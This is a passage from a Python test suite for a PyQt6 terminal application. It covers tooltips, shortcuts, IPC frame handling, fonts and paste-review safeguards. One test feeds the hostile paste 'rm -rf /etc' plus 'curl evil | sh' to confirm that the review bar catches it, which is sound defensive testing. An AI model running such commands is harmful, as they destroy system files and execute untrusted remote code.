ok(_tip2.maximumSize() == _tip2.size(),
   'InfoTip: max size is capped to content, so a WM maximize is a no-op')
_tip_running = _tip2._poll.isActive()
_tip2.close()
ok(_tip_running and not _tip2._poll.isActive(),
   'InfoTip: closeEvent stops the pointer poll')
_tip2.deleteLater()
APP.processEvents()

# --- #95: a settings (i) marker is a CLICK target that pops the copyable InfoTip
from PyQt6.QtCore import Qt as _Qt95, QEvent as _QEvent95, QPointF as _QPointF95  # noqa: E402
from PyQt6.QtGui import QMouseEvent as _QMouseEvent95            # noqa: E402
_il = M._InfoLabel('Theme <span>(i)</span>', 'the theme risk explanation', win)
ok(_il.cursor().shape() == _Qt95.CursorShape.PointingHandCursor,
   '#95: an info (i) marker uses a clickable pointing-hand cursor')
_il.mousePressEvent(_QMouseEvent95(
    _QEvent95.Type.MouseButtonPress, _QPointF95(1.0, 1.0),
    _Qt95.MouseButton.LeftButton, _Qt95.MouseButton.LeftButton,
    _Qt95.KeyboardModifier.NoModifier))
_iltip = win._tip_filter._tip
ok(_iltip.isVisible() and 'theme risk explanation' in _iltip.text(),
   '#95: clicking an (i) marker shows the copyable InfoTip with the row help')
_iltip.hide()
_iltip._poll.stop()

# --- #132: a second click on the SAME (i) marker toggles the tip closed --------
def _click95(label):
    label.mousePressEvent(_QMouseEvent95(
        _QEvent95.Type.MouseButtonPress, _QPointF95(1.0, 1.0),
        _Qt95.MouseButton.LeftButton, _Qt95.MouseButton.LeftButton,
        _Qt95.KeyboardModifier.NoModifier))
_click95(_il)
ok(_iltip.isVisible(), '#132: first click re-opens the InfoTip')
_click95(_il)
ok(not _iltip.isVisible(),
   '#132: a second click on the same marker hides it (toggle)')
_iltip._poll.stop()

# --- #130: the View > Paste delay check-mark follows the current delay ---------
win.set_paste_delay(5)                            # a preset -> that entry checks
ok(win._paste_delay_actions[5].isChecked()
   and not win._paste_delay_actions[0].isChecked(),
   '#130: setting a preset paste delay checks that menu entry')
win.set_paste_delay(7)                            # not a preset -> none checked
ok(not any(a.isChecked() for a in win._paste_delay_actions.values()),
   '#130: a custom paste delay leaves every menu entry unchecked')
win.set_paste_delay(3)                            # restore the default preset

# --- #128: menu hints are left to Qt's native tooltip (stacks above the popup);
# a non-menu widget still gets the copyable tool-window InfoTip -----------------
from PyQt6.QtWidgets import QMenu as _QMenu128                  # noqa: E402
from PyQt6.QtGui import QHelpEvent as _QHelpEvent128            # noqa: E402
_menu128 = _QMenu128(win)
_menu128.addAction('X').setToolTip('menu hint')
_he128 = _QHelpEvent128(_QEvent95.Type.ToolTip, QPoint(1, 1), QPoint(1, 1))
win._tip_filter._tip.hide()
win._tip_filter.eventFilter(_menu128, _he128)     # QMenu -> left to Qt
ok(not win._tip_filter._tip.isVisible(),
   '#128: a menu ToolTip is left to Qt, not shown as the tool-window InfoTip')
_wtip128 = M.QLabel('x', win)
_wtip128.setToolTip('row help 128')
ok(win._tip_filter.eventFilter(_wtip128, _he128)
   and win._tip_filter._tip.isVisible(),
   '#128: a non-menu widget still shows the copyable InfoTip')
win._tip_filter._tip.hide()
win._tip_filter._tip._poll.stop()

# --- _set_shortcuts skips an unknown ident in the apply loop ------------------
ok(isinstance(win._set_shortcuts({'unknown-x': ''}), list),
   '_set_shortcuts: an unknown ident is skipped')

# --- _find_tab / ctl-ls skip a stale term no longer in the tab bar ------------
from secure_terminal.terminal import SecureTerminal             # noqa: E402
_stale = SecureTerminal(command='/bin/cat')
win._tab_ids[_stale] = 987654
ok(win._find_tab('id:987654') is None, '_find_tab: a stale tab id is skipped')
ok(win._ipc_ctl('ctl-ls', {})['ok'], 'ctl-ls: a stale tab entry is skipped')
win._tab_ids.pop(_stale, None)
_stale.shutdown()

# --- the shortcuts dialog surfaces a save problem in a warning box -------------
# (no leftover-lock clear needed: the locked-keybindings block above restores it)
assert 'keybindings' not in win._locked, 'keybindings lock leaked into later tests'
_o_ss = win._set_shortcuts
_o_w2 = QMessageBox.warning
_warned = []
QMessageBox.warning = staticmethod(lambda *_a, **_k: _warned.append(1))
win._set_shortcuts = lambda _m: ['a problem']


def _exec_save_bad(self):
    for _b in self.findChildren(QPushButton):
        if _b.text() == 'Save':
            _b.click()                       # _do_save -> problems -> warning
    return int(QDialog.DialogCode.Rejected)


_o_ex = QDialog.exec
QDialog.exec = _exec_save_bad
try:
    win.show_shortcuts()
    ok(_warned, 'show_shortcuts: an invalid save surfaces a warning box')
finally:
    QDialog.exec = _o_ex
    win._set_shortcuts = _o_ss
    QMessageBox.warning = _o_w2

# --- the bell-sound picker accepts a file inside an allowed dir ----------------
import secure_terminal.terminal as _term2                       # noqa: E402
_snddir = tempfile.mkdtemp()
_sndfile = os.path.join(_snddir, 'bell.wav')
with open(_sndfile, 'wb') as _sf3b:
    _sf3b.write(b'RIFF....WAVE')
_o_dirs = _term2.BELL_SOUND_DIRS
_o_gof3 = QFileDialog.getOpenFileName
_o_bsl = win._bell_sound_locked
try:
    _term2.BELL_SOUND_DIRS = (_snddir,)
    QFileDialog.getOpenFileName = staticmethod(lambda *_a, **_k: (_sndfile, ''))
    win._bell_sound_locked = lambda: False
    _accepted_bell = []
    _o_setbell2 = win.set_bell_sound
    win.set_bell_sound = lambda p: _accepted_bell.append(p)
    try:
        win._pick_bell_sound()                # allowed -> set_bell_sound(_sndfile)
    finally:
        win.set_bell_sound = _o_setbell2
    ok(_accepted_bell == [_sndfile],
       '_pick_bell_sound: a file inside an allowed dir is accepted (set_bell_sound called)')
finally:
    _term2.BELL_SOUND_DIRS = _o_dirs
    QFileDialog.getOpenFileName = _o_gof3
    win._bell_sound_locked = _o_bsl

# --- the IPC server read path: a malformed frame is aborted -------------------
import socket as _socket                                        # noqa: E402
import struct as _struct                                        # noqa: E402
_frwin = MainWindow()
_frwin.start_instance_server('frame-test')
_fpath = M.ipc.socket_path('frame-test')
# an over-long length makes the server-side Framer raise -> the connection aborts
_bad_sock = _socket.socket(_socket.AF_UNIX, _socket.SOCK_STREAM)
try:
    _bad_sock.connect(_fpath)
    _bad_sock.sendall(_struct.pack('<I', (1 << 20) + 5) + b'xxxxx')
    for _ in range(20):
        APP.processEvents()
        QThread.msleep(15)
finally:
    _bad_sock.close()
# a header promising more than it sends leaves the frame incomplete (payload None)
_part = _socket.socket(_socket.AF_UNIX, _socket.SOCK_STREAM)
try:
    _part.connect(_fpath)
    _part.sendall(_struct.pack('<I', 100) + b'short')
    for _ in range(20):
        APP.processEvents()
        QThread.msleep(15)
finally:
    _part.close()
# the server survived the malformed + partial frames: a VALID request still gets a
# framed reply (proves no crash and no desync from the aborted / incomplete frames)
_ok_sock = _socket.socket(_socket.AF_UNIX, _socket.SOCK_STREAM)
_fr_reply = b''
try:
    _ok_sock.connect(_fpath)
    _ok_sock.sendall(M.ipc.frame(b'{"op": "ping"}'))
    for _ in range(20):
        APP.processEvents()
        QThread.msleep(15)
    _ok_sock.settimeout(1.0)
    try:
        _fr_reply = _ok_sock.recv(4096)
    except OSError:
        _fr_reply = b''
finally:
    _ok_sock.close()
ok(len(_fr_reply) > 4 and b'"ok"' in _fr_reply,
   'IPC server: after a malformed + partial frame, a valid request still gets a framed reply')
_frwin._on_instance_connection()             # no pending connection -> conn is None
ok(_frwin._server is not None and _frwin._server.isListening(),
   'IPC server: a spurious newConnection with nothing pending is a harmless no-op (still listening)')
_frwin.deleteLater()
APP.processEvents()

# --- assorted window helpers --------------------------------------------------
import signal as _sg                                            # noqa: E402
from PyQt6.QtGui import QTextCursor                             # noqa: E402
while win.tabs.count() < 2:
    win.new_tab()
win._goto_tab(8)                             # Alt+9 -> clamp to the last tab
win._goto_tab(0)
win.terminate_foreground()                   # routes to the current tab
_sl3 = set(win._locked)
try:
    win._locked = {'bell'}
    win._update_bell_tray_action()           # bell locked -> no-op
finally:
    win._locked = _sl3
ok(win._is_reserved_shortcut('') is False, '_is_reserved_shortcut: empty -> False')
# #7: a shortcut rebound to a MODIFIED cursor/Home/End key (forwarded as ESC[1;p<final>)
# or to Ctrl+<punctuation> (a C0 control byte) must be reserved -- else it shadows the key
# for a TUI program. These all read False on the pre-fix code (bare nav + Ctrl+letter only).
for _rk in ('Ctrl+End', 'Shift+Home', 'Alt+Left',
            'Ctrl+[', 'Ctrl+]', 'Ctrl+\\', 'Ctrl+Space'):
    ok(win._is_reserved_shortcut(_rk),
       '_is_reserved_shortcut: %s is reserved (forwarded to the program)' % _rk)
# keyPressEvent routes every Ctrl+Shift combo to the window shortcuts, never the child, so
# Ctrl+Shift+<nav> and Ctrl+Shift+<letter> both stay available to rebind (not reserved).
for _ak in ('Ctrl+Shift+T', 'Ctrl+Shift+End'):
    ok(not win._is_reserved_shortcut(_ak),
       '_is_reserved_shortcut: %s stays available (routed to a window shortcut)' % _ak)
_o_sig5 = _sg.signal
try:
    _sg.signal = lambda *_a, **_k: (_ for _ in ()).throw(ValueError())
    M._install_signal_quit(APP)              # every signal.signal raises -> tolerated
    ok(True, '_install_signal_quit tolerates an unsettable signal')
finally:
    _sg.signal = _o_sig5

# show_find: no-tab guard, and seeding from a single-line selection
_nf2 = MainWindow()
while _nf2.tabs.count():
    _nf2.tabs.removeTab(0)
_nf2.show_find()                             # no current tab -> return
_nf2.deleteLater()
APP.processEvents()
_sf2 = win.current()
_sf2._append('SEEDLINE')
_tc = _sf2.textCursor()
_tc.movePosition(QTextCursor.MoveOperation.End)
_tc.movePosition(QTextCursor.MoveOperation.StartOfLine, QTextCursor.MoveMode.KeepAnchor)
_sf2.setTextCursor(_tc)                      # select the last line only
win.show_find()                              # a single-line selection seeds the query
ok('SEEDLINE' in win._find_bar.input.text(),
   'show_find seeds the query from a single-line selection')

# current_zoom_percent + _ipc_open bare reuse on a tab-less window
_zw2 = MainWindow()
while _zw2.tabs.count():
    _zw2.tabs.removeTab(0)
ok(_zw2.current_zoom_percent() == getattr(_zw2, '_default_zoom', 100),
   'current_zoom_percent: the default with no tab')
ok(_zw2.current_theme_key() == getattr(_zw2, '_default_theme', 'light'),
   'current_theme_key: the default theme with no tab')
_zw2._ipc_open({})                           # nothing to open -> ensure a usable tab
ok(_zw2.tabs.count() >= 1, 'ipc open with nothing still leaves a usable tab')
_zw2.deleteLater()
APP.processEvents()

# a window built with the tray enabled shows the tray icon at startup
_cfgd3 = os.path.join(os.environ['XDG_CONFIG_HOME'], 'secure-terminal.d')
os.makedirs(_cfgd3, exist_ok=True)
_trayconf = os.path.join(_cfgd3, '70-tray.conf')
with open(_trayconf, 'w', encoding='utf-8') as _tf:
    _tf.write('systray=true\n')
_wt2 = MainWindow()
# The actual QSystemTrayIcon cannot build under offscreen (no system tray), so assert
# the real read-back that IS deterministic: the systray=true config was honored.
ok(_wt2._systray is True,
   'a window with systray=true reads the tray-enable config (tray armed at startup)')
_wt2.deleteLater()
APP.processEvents()
os.remove(_trayconf)

# --- InfoTip: pointer polling, a destroyed source, and Esc-to-hide ------------
_tip = M.InfoTip(win)
_probe_w = MainWindow()
# _check_pointer hides when the pointer is over NEITHER the tip nor its source. Make
# that deterministic offscreen: move the tip far from the (0,0-ish) cursor and drop
# the source, so both the over-tip and over-source checks are false.
_tip.show_for(_probe_w, 'inspect', 100, 'light')
_tip.move(9000, 9000)
_tip._source = None
_tip._check_pointer()
ok(not _tip.isVisible(),
   'InfoTip: _check_pointer hides once the pointer is over neither tip nor source')
# a destroyed source is CAUGHT (RuntimeError on mapToGlobal), cleared to None, and,
# with the tip off the cursor, the tip hides -- not a crash. sip.delete force-destroys
# the C++ source NOW so mapToGlobal reliably raises (deleteLater is too lazy offscreen).
from PyQt6 import sip as _sip                                   # noqa: E402
_tip.show_for(_probe_w, 'inspect', 100, 'light')
_tip.move(9000, 9000)
_sip.delete(_probe_w)
_tip._check_pointer()
ok(not _tip.isVisible() and _tip._source is None,
   'InfoTip: a destroyed source is caught (source cleared, no crash) and the tip hides')
from PyQt6.QtGui import QKeyEvent as _QKE2                       # noqa: E402
from PyQt6.QtCore import QEvent as _QEv2                         # noqa: E402
_tip.show_for(win, 'inspect', 100, 'light')
_tip.keyPressEvent(_QKE2(_QEv2.Type.KeyPress, Qt.Key.Key_Escape,
                         Qt.KeyboardModifier.NoModifier, ''))    # Esc -> hide
ok(not _tip.isVisible(), 'InfoTip: Esc hides the tip')
_tip.show_for(win, 'inspect', 100, 'light')
_tip.keyPressEvent(_QKE2(_QEv2.Type.KeyPress, Qt.Key.Key_A,
                         Qt.KeyboardModifier.NoModifier, 'a'))   # other -> super, stays up
ok(_tip.isVisible(), 'InfoTip: a non-Esc key does not hide the tip (passed to super)')
_tip.deleteLater()
APP.processEvents()

# --- show_find seeds from a single-line selection -----------------------------
if win.tabs.count() == 0:
    win.new_tab()
_sf = win.current()
# Build a DETERMINISTIC two-line document (a prior output line + the query line) so the
# selection spans a block boundary regardless of whether the child shell has printed a
# prompt yet. The old code relied on selectAll() picking up a prompt line, which races
# the child in offscreen CI -- there selectAll yielded a single-line 'findmetext' (no
# U+2029), so show_find SEEDED and this assert tripped.
_sfc = _sf.textCursor()
_sfc.movePosition(QTextCursor.MoveOperation.End)
_sfc.insertText('previous output')
_sfc.insertBlock()
_sfc.insertText('findmetext')
_sf.selectAll()                              # spans two blocks -> U+2029 -> MULTI-line
ok('\u2029' in _sf.textCursor().selectedText(),
   'precondition: the selection genuinely spans multiple lines (U+2029 present)')
win._find_bar.input.setText('')             # clear any prior seed
win.show_find()
ok(win._find_bar.input.text() == '',
   'show_find does NOT seed from a multi-line selection (the paragraph-separator guard)')

# --- _find_step wraps within a tab, and returns with no current tab -----------
win._find_bar.all_tabs.setChecked(False)
win._find_bar.input.setText('findmetext')
from PyQt6.QtGui import QTextCursor                              # noqa: E402
_sf.moveCursor(QTextCursor.MoveOperation.End)
win._find_step(False)                        # not found ahead -> wrap to start
win._find_step(True)                         # backward wrap
_zf = MainWindow()
while _zf.tabs.count():
    _zf.tabs.removeTab(0)
_zf._find_bar.input.blockSignals(True)        # avoid _find_update with no tab
_zf._find_bar.input.setText('x')
_zf._find_bar.input.blockSignals(False)
_zf._find_step(False)                         # no current tab in the wrap branch
ok(True, '_find_step wraps within a tab and is safe with no current tab')
_zf.deleteLater()
APP.processEvents()

# --- _set_shortcuts: a valid mapping with an unknown ident is skipped ----------
_r2 = win._set_shortcuts({'no-such-ident': 'Ctrl+Alt+Z'})
ok(isinstance(_r2, list), '_set_shortcuts: an unknown ident is skipped in the apply loop')

# --- icon helpers: themed hit, null-icon fallback, toolbar-toggle theme hit ----
from PyQt6.QtGui import QIcon                                    # noqa: E402
_o_fromtheme = QIcon.fromTheme
try:
    QIcon.fromTheme = staticmethod(lambda *_a, **_k: M._letter_icon('X', '#111111'))
    ok(not _REAL_APP_ICON().isNull(), '_app_icon: a themed icon is used when present')
    ok(not M._toggle_icon('x', 'Y', '#222222').isNull(),
       '_toggle_icon: the desktop theme symbol is used when present')
    QIcon.fromTheme = staticmethod(lambda *_a, **_k: QIcon())    # null theme icon
    # the theme lacks the symbol -> _toggle_icon draws the letter-chip fallback
    ok(not M._toggle_icon('x', 'Y', '#222222').isNull(),
       '_toggle_icon: draws the letter-chip fallback when the theme lacks the symbol')
    _o_exists = os.path.exists
    try:
        os.path.exists = lambda path: True          # a shipped icon path is present
        ok(_REAL_APP_ICON() is not None,
           '_app_icon: loads the shipped SVG by path when no theme icon exists')
        os.path.exists = lambda path: False
        ok(_REAL_APP_ICON().isNull(), '_app_icon: a null icon when nothing is found')
    finally:
        os.path.exists = _o_exists
finally:
    QIcon.fromTheme = _o_fromtheme

# --- _apply_global keeps locked keys at their admin value ----------------------
_sl2 = set(win._locked)
try:
    win._locked = {'tui', 'colors', 'osc_notice', 'unicode_mode', 'osc_title',
                   'font_family'}
    win._default_font_family = 'Hack'
    win._apply_global({'theme': 'dark', 'zoom': 100, 'mode': 'box',
                       'font_family': 'Attacker Font', 'font_size': 20,
                       'colors': True, 'line_edits': True, 'tui': True, 'osc_notice': True,
                       'tui_autobox_notice': True,
                       'osc': {'osc_title': True}, 'scrollback': 1000,
                       'paste_delay': 3, 'escape_limit': 4096, 'persist': False})
    ok(win._default_font_family == 'Hack',
       '_apply_global preserves admin-locked keys (incl. a locked font_family)')
finally:
    win._locked = _sl2

# --- save_transcript to an unwritable path is swallowed -----------------------
from PyQt6.QtWidgets import QFileDialog as _QFD3                 # noqa: E402
_o_gsf = _QFD3.getSaveFileName
try:
    _QFD3.getSaveFileName = staticmethod(
        lambda *_a, **_k: ('/proc/nonexistent-dir/x.txt', ''))
    win.save_transcript()                   # open() raises OSError -> swallowed
    ok(True, 'save_transcript: an unwritable path is swallowed')
finally:
    _QFD3.getSaveFileName = _o_gsf

# --- _open_path opens an existing folder and falls back to a parent -----------
# Stub openUrl: offscreen QPA does not spawn, but a direct run under a real desktop
# platform would pop an external file-manager window -- capture the path instead.
_op_opened = []
_op_oou = _QDS.openUrl
try:
    def _spy_open_url_path(url):
        _op_opened.append(url.toLocalFile())
        return True
    _QDS.openUrl = staticmethod(_spy_open_url_path)
    win._open_path('/tmp')                       # exists  # nosec B108 -- known-existing dir to exercise _open_path
    win._open_path('/tmp/no-such-dir-xyz/child') # missing -> parent  # nosec B108 -- missing path exercises the parent-fallback branch
finally:
    _QDS.openUrl = _op_oou
ok(len(_op_opened) == 2 and _op_opened[0] == '/tmp',  # nosec B108 -- '/tmp' is an expected-value string in an assertion, not a temp path
   '_open_path opens the folder, and a missing path falls back to a parent')

# --- the font-noise message handler drops the flood, passes real messages -----
from PyQt6.QtCore import qWarning                                # noqa: E402
import io as _io_fn                                              # noqa: E402
M._quiet_font_warnings()
_fn_sink = _io_fn.StringIO()
_fn_orig_stderr = sys.stderr
sys.stderr = _fn_sink                                  # the handler writes real msgs here
try:
    qWarning('OpenType support missing for "Something"')   # font noise -> dropped
    qWarning('a genuine warning')                          # real -> passed through
finally:
    sys.stderr = _fn_orig_stderr
_fn_out = _fn_sink.getvalue()
ok('genuine warning' in _fn_out and 'OpenType support missing' not in _fn_out,
   'the font-noise handler drops font noise and passes real messages (sink capture)')

# --- main(): a SIGCHLD-install failure during startup is tolerated ------------
_o_argv3 = sys.argv[:]
_o_sr4 = M.ipc.send_request
_o_qa3 = M.QApplication
_o_qexec3 = QApplication.exec
import signal as _sig3                                           # noqa: E402
_o_sig = _sig3.signal
_o_chld3 = _sig3.getsignal(_sig3.SIGCHLD)
try:
    M.ipc.send_request = lambda *_a, **_k: None


    class _AP3:
        def __call__(self, _a):
            return APP

        def __getattr__(self, _n):
            return getattr(QApplication, _n)

    M.QApplication = _AP3()
    M.QFontDatabase = _FontDBPresent    # startup is font-independent here
    QApplication.exec = lambda _s: 0

    def _sig_maybe_raise(signum, handler):
        if signum == _sig3.SIGCHLD:
            raise ValueError('cannot set SIGCHLD here')
        return _o_sig(signum, handler)

    _sig3.signal = _sig_maybe_raise
    sys.argv = ['secure-terminal', '--new-instance']
    eq(M.main(), 0, 'main: a SIGCHLD-install failure during startup is tolerated')
finally:
    _sig3.signal = _o_sig
    sys.argv = _o_argv3
    M.ipc.send_request = _o_sr4
    M.QApplication = _o_qa3
    M.QFontDatabase = _REAL_QFONTDB
    QApplication.exec = _o_qexec3
    _sig3.signal(_sig3.SIGCHLD, _o_chld3)

# F5: the module-level SIGCHLD handler delegates to SecureTerminal.reap_pty_children --
# reaping only our own pty children, never a subprocess child -- so it replaces the
# returncode-defanging SIGCHLD=SIG_IGN. It ignores its (signum, frame) args.
M._reap_pty_children(_sig3.SIGCHLD, None)
ok(True, '_reap_pty_children handler runs without error')

# --- set_font_family / choose_font: the per-tab font picker -------------------
from PyQt6.QtGui import QFont as _QFont                          # noqa: E402
from PyQt6.QtWidgets import QFontDialog as _QFontDialog          # noqa: E402
if win.tabs.count() == 0:
    win.new_tab()
win.set_font_family('DejaVu Sans Mono')         # normal path: apply + persist
eq(win._default_font_family, 'DejaVu Sans Mono',
   'set_font_family sets the tab family and the new-tab default')
win.set_font_family('')                          # empty -> falls back to the default
ok(win._default_font_family, 'set_font_family: an empty family falls back to the default')
_sfl = set(win._locked)
try:
    win._locked = {'font_family'}
    _before = win._default_font_family
    win.set_font_family('Ignored')               # admin-locked -> early return
    eq(win._default_font_family, _before,
       'set_font_family: an admin-locked family is not changed')
finally:
    win._locked = _sfl

# font_size from config: a valid value is honoured; a bad one falls back to the base
import secure_terminal.settings as _setmod_fs                     # noqa: E402
from secure_terminal.settings import Config as _Cfg_fs            # noqa: E402
from secure_terminal.terminal import BASE_POINT_SIZE as _BPS_fs   # noqa: E402
_o_load_fs = _setmod_fs.load
_base_cfg_fs = _o_load_fs()


def _cfg_with(**over):
    return _Cfg_fs({**dict(_base_cfg_fs), **over}, _base_cfg_fs.locked,
                   _base_cfg_fs.violations)


try:
    _setmod_fs.load = lambda: _cfg_with(font_size='16', ui_scale='150',
                                        font_family='DejaVu Sans Mono')
    _wfs = MainWindow()
    eq(_wfs._default_font_size, 16, 'font_size read from config (valid int)')
    eq(_wfs._default_font_family, 'DejaVu Sans Mono', 'font_family read from config')
    eq(_wfs._ui_scale, 150, 'ui_scale (menu size) read from config (valid int)')
    _setmod_fs.load = lambda: _cfg_with(font_size='not-a-number')
    _wfs2 = MainWindow()
    eq(_wfs2._default_font_size, _BPS_fs,
       'an invalid font_size falls back to the base point size')
finally:
    _setmod_fs.load = _o_load_fs

# the global-settings dialog now carries the paste/copy REVIEW level; _apply_global
# stores it and applies it to every open tab.
_pw_save, _cw_save = win._paste_warn, win._copy_warn
try:
    win._apply_global({'theme': 'dark', 'zoom': 100,
                       'font_family': win._default_font_family,
                       'font_size': win._default_font_size, 'mode': 'box',
                       'colors': True, 'line_edits': True, 'tui': False,
                       'osc': {}, 'osc_notice': True, 'tui_autobox_notice': True,
                       'scrollback': 0, 'paste_delay': 3, 'escape_limit': 4096,
                       'paste_warn': 'always', 'copy_warn': 'never', 'persist': False})
    eq((win._paste_warn, win._copy_warn), ('always', 'never'),
       '_apply_global stores the paste/copy review levels')
    ok(all(t.current_paste_warn() == 'always' and t.current_copy_warn() == 'never'
           for t in win._real_terms()),
       '_apply_global applies the paste/copy review levels to every open tab')
finally:
    win._paste_warn, win._copy_warn = _pw_save, _cw_save

# UI (menu) scale: _select_labels enlarges a dialog's font for readability; the base
# point size is captured once so a re-scaled fresh dialog never compounds, and a
# scale of 100 is a no-op.
from secure_terminal.main import _select_labels as _sel_scale     # noqa: E402
from PyQt6.QtWidgets import QDialog as _QDlgScale                  # noqa: E402
_probe_dlg = _QDlgScale()
_probe_before = _probe_dlg.font().pointSizeF()
_sel_scale(_probe_dlg, 150)
ok(_probe_dlg.font().pointSizeF() > _probe_before or _probe_before <= 0,
   '_select_labels(scale=150) enlarges the dialog font (menu zoom)')
_probe_dlg2 = _QDlgScale()
_pb2 = _probe_dlg2.font().pointSizeF()
_sel_scale(_probe_dlg2, 100)
eq(_probe_dlg2.font().pointSizeF(), _pb2,
   '_select_labels(scale=100) leaves the dialog font unchanged')
_us_save = win._ui_scale
try:
    win._apply_global({'theme': 'dark', 'zoom': 100,
                       'font_family': win._default_font_family,
                       'font_size': win._default_font_size, 'ui_scale': 175,
                       'mode': 'box', 'colors': True, 'line_edits': True, 'tui': False, 'osc': {},
                       'osc_notice': True, 'tui_autobox_notice': True,
                       'scrollback': 0, 'paste_delay': 3, 'escape_limit': 4096,
                       'persist': False})
    eq(win._ui_scale, 175, '_apply_global stores the menu (UI) scale')
finally:
    win._ui_scale = _us_save

_o_getfont = _QFontDialog.getFont
try:
    _QFontDialog.getFont = staticmethod(
        lambda *_a, **_k: (_QFont('DejaVu Sans Mono'), True))
    win.choose_font()                            # accepted -> set_font_family
    ok(win._default_font_family == 'DejaVu Sans Mono',
       'choose_font: an accepted pick applies the family')
    _QFontDialog.getFont = staticmethod(lambda *_a, **_k: (_QFont('X'), False))
    win.choose_font()                            # cancelled -> no change
    ok(win._default_font_family == 'DejaVu Sans Mono',
       'choose_font: a cancelled pick leaves the family unchanged')
finally:
    _QFontDialog.getFont = _o_getfont

# choose_font with no current tab returns before the dialog
_nf3 = MainWindow()
while _nf3.tabs.count():
    _nf3.tabs.removeTab(0)
_nf3.choose_font()                               # no tab -> return
ok(True, 'choose_font: no current tab -> returns before the dialog')
_nf3.deleteLater()
APP.processEvents()

# choose_font: a Qt build without the MonospacedFonts option falls back to no
# options (the defensive AttributeError branch)
_o_qfd = M.QFontDialog
try:
    class _FakeFDO:
        def __getattr__(self, _n):
            raise AttributeError(_n)             # .MonospacedFonts -> AttributeError

        def __call__(self, _n):
            return 0

    class _FakeFontDialog:
        FontDialogOption = _FakeFDO()

        @staticmethod
        def getFont(*_a, **_k):
            return (_QFont('DejaVu Sans Mono'), True)

    M.QFontDialog = _FakeFontDialog
    win.choose_font()                            # MonospacedFonts missing -> fallback opts
    ok(True, 'choose_font: a missing MonospacedFonts option falls back to no options')
finally:
    M.QFontDialog = _o_qfd

# --- set_paste_warn / set_copy_warn: valid modes applied to every tab ----------
win.set_paste_warn('always')
eq(win._paste_warn, 'always', 'set_paste_warn applies the chosen mode')
win.set_copy_warn('always')
eq(win._copy_warn, 'always', 'set_copy_warn applies the chosen mode')
win.set_paste_warn('bogus')                      # invalid -> ignored
eq(win._paste_warn, 'always', 'set_paste_warn: an invalid mode is ignored')
win.set_copy_warn('unicode')
win.set_paste_warn('unicode')
_pw_term = win.current()
ok(_pw_term.current_paste_warn() == 'unicode'
   and _pw_term.current_copy_warn() == 'unicode',
   'set_paste_warn / set_copy_warn push the mode to every tab (tab-level read-back)')

# --- review risk lamp (#116): reflects the config and goes red on unreviewed risk
from PyQt6.QtWidgets import QDialog as _QDlgSec                    # noqa: E402
_pw0, _cw0, _ur0 = win._paste_warn, win._copy_warn, win._unreviewed_risk
try:
    win.set_paste_warn('unicode')
    win.set_copy_warn('unicode')
    win._unreviewed_risk = False
    eq(win._review_level()[0], '#1f8a54',
       'review lamp is green when both directions are reviewed')
    win.set_paste_warn('never')
    eq(win._review_level()[0], '#e5a50a',
       "review lamp is yellow when a direction's review is off")
    win._on_unreviewed_risk()
    ok(win._unreviewed_risk and win._review_level()[0] == '#e5484d',
       'unreviewed risk lights the review lamp red')
    win._on_unreviewed_risk()                    # already red -> stays red, no error
    _osec = _QDlgSec.exec
    _QDlgSec.exec = lambda _self: int(_QDlgSec.DialogCode.Accepted)
    try:
        win._show_security_details()             # acknowledging clears the red
    finally:
        _QDlgSec.exec = _osec
    ok(not win._unreviewed_risk,
       'opening the security details acknowledges and clears the red review lamp')
finally:
    win.set_paste_warn(_pw0)
    win.set_copy_warn(_cw0)
    win._unreviewed_risk = _ur0

# --- the paste/copy review bar: _show_review / _hide_paste_review --------------
from secure_terminal.terminal import SecureTerminal as _ST2      # noqa: E402
if win.tabs.count() == 0:
    win.new_tab()
_rvterm = win.current()
win._show_review(_rvterm, 'risky text', 0, 'paste')   # current tab -> bar shown
ok(win._review_bar.reviewed_term() is _rvterm,
   '_show_review shows the review bar for the active tab')
win._hide_paste_review(_rvterm)                        # current tab -> refocus
# a request from a NON-current tab is ignored (its text stays held)
_bgterm = _ST2(command='/bin/cat')
win._show_review(_bgterm, 'held', 0, 'copy')           # not current -> return
ok(win._review_bar.reviewed_term() is not _bgterm,
   '_show_review ignores a background tab (the bar is not shown for it)')
win._hide_paste_review(_bgterm)                        # not current -> no refocus
_bgterm.shutdown()

# #2 cross-tab strand: ONE review bar is shared across tabs, so resolving tab A's
# review must NOT tear down a review the bar has since been re-shown for tab B.
# CANARY: the old _hide_paste_review hid the bar UNCONDITIONALLY -> B stranded
# (input suspended on B, its bar gone, its pending paste silently discarded).
_tabA = win.current()
win._show_review(_tabA, 'A risky', 0, 'paste')         # bar shows A (A is current)
win.new_tab()                                          # B becomes the current tab
_tabB = win.current()
ok(_tabB is not _tabA, 'a second tab is current')
win._show_review(_tabB, 'B risky', 0, 'paste')         # bar re-shown for B
ok(win._review_bar.reviewed_term() is _tabB, 'the bar now tracks tab B')
win._hide_paste_review(_tabA)                          # A resolved in the background
ok(win._review_bar.reviewed_term() is _tabB,
   "resolving tab A does NOT tear down tab B's still-open review (no strand)")
win._hide_paste_review(_tabB)                          # B resolves its OWN review
ok(win._review_bar.reviewed_term() is None,
   'a tab resolving its own review still hides the bar')

# REAL-GUI regression (the tests above drive _show_review/_hide_paste_review DIRECTLY,
# so they never exercised the real button-click -> _choose -> dispatch -> resolved ->
# _hide_paste_review chain). Two bugs lived in that gap:
#  (1) _choose clears the bar's _term before dispatching, so _hide_paste_review's
#      reviewed_term()-is-term guard then SKIPPED hide_review() -- the bar stayed OPEN
#      after a real click ("all buttons do nothing").
#  (2) the send buttons were setEnabled(False) during the countdown, so a DISABLED
#      button could not take focus -> focusing one to PREVIEW its delivered form did
#      nothing. Drive real clicks + real focus in a SHOWN window (isVisible is only
#      meaningful when the hierarchy is shown).
from PyQt6.QtCore import QMimeData as _QMimeRB                  # noqa: E402
_rbwin = MainWindow(); _rbwin.resize(900, 500); _rbwin.show(); pump()
if _rbwin.tabs.count() == 0:
    _rbwin.new_tab()
_rbt = _rbwin.current(); _rbt.apply_paste_warn('unicode'); _rbt.apply_paste_delay(0); pump()
_rbar = _rbwin._review_bar
_rbm = _QMimeRB(); _rbm.setText('rm -rf /etc\ncurl evil | sh\n'); _rbt.insertFromMimeData(_rbm); pump()
ok(_rbt.review_pending() and _rbar.reviewed_term() is _rbt and _rbar.isVisible(),
   'a real multi-line paste shows the review bar')
_rbar._reject.click(); pump()                                  # REAL click, not _hide_paste_review
ok(not _rbt.review_pending(), 'the real Reject click dispatched the reject')
ok(not _rbar.isVisible() and _rbar.reviewed_term() is None,
   'the bar HIDES after a real button click (regression: the guard left it open)')

# countdown: a paste with a delay leaves the Deliver button DISABLED (gated) until the
